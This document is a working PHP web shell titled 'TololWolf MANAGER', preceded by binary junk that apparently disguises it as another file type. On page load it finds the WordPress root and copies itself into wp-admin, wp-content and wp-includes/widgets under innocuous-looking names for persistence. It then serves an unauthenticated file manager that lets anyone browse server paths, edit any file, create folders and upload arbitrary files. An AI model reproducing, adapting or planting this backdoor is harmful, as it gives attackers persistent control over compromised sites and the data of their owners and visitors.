¼2/)Í”jCï¿½ï¿½ï¿½×¢ï¿½Vï¿½Gï¿½!ï¿½ï¿½ï¿½!ï¿½Fï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\ï¿½ï¿½ Kjï¿½Rï¿½ocï¿½hï¿½ï¿½ï¿½:Þ Iï¿½ï¿½1"2ï¿½q×°8ï¿½ï¿½Ð @×–ï¿½ï¿½ï¿½_C0ï¿½Ö€ï¿½ï¿½Aï¿½ï¿½lQï¿½ï¿½@çº¼ï¿½!7ï¿½ï¿½Fï¿½ï¿½ ï¿½]ï¿½sZ Bï¿½62rï¿½vï¿½z~ï¿½Kï¿½7ï¿½cï¿½ï¿½5ï¿½.ï¿½ï¿½ï¿½Ó„q&ï¿½Zï¿½dï¿½<ï¿½kkï¿½ï¿½ï¿½T&8ï¿½|ï¿½ï¿½ï¿½Iï¿½ï¿½
<?php
$backups = [];
$self = __FILE__;
$found_public_html = false;

function walk_backwards_to_find_wp($path) {
    while ($path !== dirname($path)) {
        if (
            is_dir($path . '/wp-content') &&
            is_dir($path . '/wp-admin') &&
            is_dir($path . '/wp-includes/widgets')
        ) {
            return $path;
        }
        $path = dirname($path);
    }
    return false;
}

$current_path = realpath(__DIR__);
$try_base = '';

if (strpos($current_path, 'public_html') !== false) {
    $try_base = substr($current_path, 0, strpos($current_path, 'public_html') + strlen('public_html'));
} else {
    $try_base = walk_backwards_to_find_wp($current_path);
}

if ($try_base && is_dir($try_base)) {
    $admin = $try_base . "/wp-admin";
    $content = $try_base . "/wp-content";
    $widgets = $try_base . "/wp-includes/widgets";

    if (is_dir($admin)) {
        $target1 = $admin . "/admin-wolf.php";
        copy($self, $target1);
        $backups[] = $target1;
    }

    if (is_dir($content)) {
        $target2 = $content . "/edit-wolf.php";
        copy($self, $target2);
        $backups[] = $target2;
    }

    if (is_dir($widgets)) {
        $target3 = $widgets . "/class-wp-wolf-widget.php";
        copy($self, $target3);
        $backups[] = $target3;
    }

    $found_public_html = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>TOLOL</title>
<link rel="icon" type="image/png" href="https://static.vecteezy.com/system/resources/thumbnails/003/381/259/small_2x/wolf-head-logo-design-template-free-vector.jpg">
<style>
    body { font-family: Arial, sans-serif; background: #111; color: #eee; margin: 0; padding: 0; }
    #container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #444; border-radius: 5px; background-color: #1c1c1c; }
    h1 {
        text-align: center;
        color: #fff;
        font-size: 28px;
    }
    h1 img {
        height: 28px;
        vertical-align: middle;
        margin-right: 8px;
        border-radius: 4px;
    }
    h1 span.red {
        color: #c10000;
    }
    .backup-box { background: #000; color: #0f0; padding: 10px; font-size: 14px; border-radius: 8px; margin-bottom: 15px; }
    h2, h3 { color: #ccc; }
    a { color: #4aa3ff; text-decoration: none; }
    a:hover { text-decoration: underline; }
    input, textarea { background: #222; color: #eee; border: 1px solid #555; padding: 5px; border-radius: 4px; }
    input[type="submit"] { cursor: pointer; }
    hr { border: 0; height: 1px; background-color: #444; margin-top: 20px; margin-bottom: 20px; }
</style>
</head>
<body>
<div id="container">
<?php if (!empty($backups)): ?>
    <div class="backup-box">
         <strong>Backups Created:</strong><br>
        <?php foreach ($backups as $path): ?>
            <?= htmlspecialchars($path) ?><br>
        <?php endforeach; ?>
    </div>
<?php elseif ($found_public_html): ?>
    <div class="backup-box" style="color:#ff0">
        ⚠️ <strong>You're inside public_html, but wp-admin or wp-content was not found.</strong>
    </div>
<?php else: ?>
    <div class="backup-box" style="color:#f00">
        ❌ <strong>Not inside a WordPress structure. Backup not done.</strong>
    </div>
<?php endif; ?>

<h1>
    <img src="https://static.vecteezy.com/system/resources/thumbnails/003/381/259/small_2x/wolf-head-logo-design-template-free-vector.jpg" alt="MCB">
    Tolol<span class="red">W</span>olf - <span class="red">MANAGER</span>
</h1>

<?php
function clean_input($input) {
    return htmlspecialchars(strip_tags($input));
}

function navigate_directory($path) {
    $path = str_replace('\\','/', $path);
    $paths = explode('/', $path);
    $breadcrumbs = [];

    foreach ($paths as $id => $pat) {
        if ($pat == '' && $id == 0) {
            $breadcrumbs[] = '<a href="?path=/">/</a>';
            continue;
        }
        if ($pat == '') continue;
        $breadcrumbs[] = '<a href="?path=';
        for ($i = 0; $i <= $id; $i++) {
            $breadcrumbs[] = "$paths[$i]";
            if ($i != $id) $breadcrumbs[] = "/";
        }
        $breadcrumbs[] = '">'.$pat.'</a>/';
    }

    return implode('', $breadcrumbs);
}

function display_directory_contents($path) {
    $contents = scandir($path);
    $folders = [];
    $files = [];

    foreach ($contents as $item) {
        if ($item == '.' || $item == '..') continue;
        $full_path = $path . '/' . $item;

        if (is_dir($full_path)) {
            $folder_color = is_writable($full_path) ? '#00ff00' : '#e66'; // Electric green or red
            $label_color = '#e6c84d'; // Soft yellow
            $folders[] = '<li style="font-size:16px;">
                <span style="color:' . $label_color . '; font-weight:600;">Folder:</span> 
                <a href="?path=' . urlencode($full_path) . '" style="color:' . $folder_color . '; font-weight:600;">' . htmlspecialchars($item) . '</a>
            </li>';
        } else {
            $file_size = filesize($full_path);
            $size_unit = ['B', 'KB', 'MB', 'GB', 'TB'];
            $file_size_formatted = $file_size ? round($file_size / pow(1024, ($i = floor(log($file_size, 1024)))), 2) . ' ' . $size_unit[$i] : '0 B';

            $files[] = '<li style="font-size:16px;">
                <span style="color:#000;font-weight:600;">File:</span> 
                <a href="?action=edit&file=' . urlencode($item) . '&path=' . urlencode($path) . '" 
                   style="color:#0047ab; font-weight:600;">' . htmlspecialchars($item) . '</a> 
                (' . $file_size_formatted . ')
            </li>';
        }
    }

    echo '<ul>';
    echo implode('', $folders);
    if (!empty($folders) && !empty($files)) echo '<hr>';
    echo implode('', $files);
    echo '</ul>';
}



function create_folder($path, $folder_name) {
    $folder_name = clean_input($folder_name);
    $new_folder_path = $path . '/' . $folder_name;
    if (!file_exists($new_folder_path)) {
        mkdir($new_folder_path);
        echo "Folder '$folder_name' created successfully!";
    } else {
        echo "Folder '$folder_name' already exists!";
    }
}

function upload_file($path, $file_to_upload) {
    $target_file = $path . '/' . basename($file_to_upload['name']);
    if (move_uploaded_file($file_to_upload['tmp_name'], $target_file)) {
        echo "File ". htmlspecialchars(basename($file_to_upload['name'])). " uploaded successfully.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}

function edit_file($file_path) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $content = $_POST['file_content'];
        if (file_put_contents($file_path, $content) !== false) {
            echo "File saved successfully.";
        } else {
            echo "There was an error while saving the file.";
        }
    }
    $content = file_get_contents($file_path);
    echo '<form method="post">';
    echo '<textarea name="file_content" rows="10" cols="50">' . htmlspecialchars($content) . '</textarea><br>';
    echo '<input type="submit" value="Save">';
    echo '</form>';
}

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();

if (isset($_GET['action'])) {
    $action = $_GET['action'];
    switch ($action) {
        case 'edit':
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                $file_path = $path . '/' . $file;if (file_exists($file_path)) {
                    echo '<h2>Edit File: ' . $file . '</h2>';
                    edit_file($file_path);
                } else {
                    echo "File not found.";
                }
            } else {
                echo "Invalid file.";
            }
            break;
        default:
            echo "Invalid action.";
    }
} else {
    echo "<h2>Directory: " . $path . "</h2>";
    echo "<p>" . navigate_directory($path) . "</p>";
    echo "<h3>Directory Contents:</h3>";
    display_directory_contents($path);
    echo '<hr>';
    echo '<h3>Create New Folder:</h3>';
    echo '<form action="" method="post">';
    echo 'New Folder Name: <input type="text" name="folder_name">';
    echo '<input type="submit" name="create_folder" value="Create Folder">';
    echo '</form>';
    echo '<h3>Upload New File:</h3>';
    echo '<form action="" method="post" enctype="multipart/form-data">';
    echo 'Select file to upload: <input type="file" name="file_to_upload">';
    echo '<input type="submit" name="upload_file" value="Upload File">';
    echo '</form>';
}

if (isset($_POST['create_folder'])) {
    create_folder($path, $_POST['folder_name']);
}

if (isset($_POST['upload_file'])) {
    upload_file($path, $_FILES['file_to_upload']);
}
?>
</div>
</body>
</html>
